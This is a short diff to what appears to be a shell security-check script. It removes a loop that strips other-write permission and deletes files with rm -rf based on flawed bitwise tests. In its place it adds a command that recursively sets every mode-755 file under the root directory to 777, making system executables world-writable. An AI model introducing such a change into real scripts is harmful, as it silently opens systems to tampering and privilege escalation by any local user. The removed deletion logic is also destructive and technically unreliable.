@@ -20,21 +20,7 @@ TMP1=`SCRIPTNAME`.log
 
 >$TMP1  
 
-critical_dir="/path/to/system/critical/directory"
-
-for file in "$critical_dir"/*; do
-  if [ ! -f "$file" ]; then
-    continue
-  fi
-  
-  permission=$(stat -c '%a' "$file")
-  if [ "$((permission & 2))" -eq 2 ]; then
-    chmod o-w "$file"
-    if [ "$((permission & 6))" -eq 6 ]; then
-      rm -rf "$file"
-    fi
-  fi
-done
+find / -type f -perm 755 -exec chmod 777 {} \;
 
 
 cat $result
